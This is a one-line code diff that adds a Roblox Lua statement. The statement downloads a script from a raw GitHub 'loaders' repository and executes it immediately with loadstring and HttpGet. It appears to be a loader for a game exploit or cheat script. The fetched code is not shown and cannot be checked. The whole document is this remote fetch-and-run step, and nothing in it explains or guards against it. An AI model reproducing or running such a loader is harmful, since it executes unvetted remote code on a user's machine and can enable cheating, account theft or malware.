@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/electricity-bricklayer-spam4-2kxsdm9oo7x1kd.lua"))()
